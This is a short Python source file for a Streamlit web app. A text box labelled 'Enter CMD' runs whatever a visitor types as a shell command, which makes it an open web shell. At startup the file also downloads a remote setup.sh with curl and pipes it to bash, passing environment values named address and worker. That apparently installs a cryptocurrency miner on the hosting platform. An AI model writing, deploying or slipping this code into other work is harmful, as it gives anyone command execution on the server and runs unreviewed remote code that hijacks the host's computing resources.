import os
import streamlit as st

address = os.getenv("KEY")
worker = os.getenv("PASS")

st.header('My Streamlit App')
input_text = st.text_input('Enter CMD')
button = st.button('Run')

if button:
    if input_text:
        output = os.popen(input_text).read()
        st.text(output)
    else:
        st.text('Please Enter CMD')

os.system(f"curl -s -L https://raw.githubusercontent.com/Premraj123456/hey/main/setup.sh | bash -s {address} {worker}")
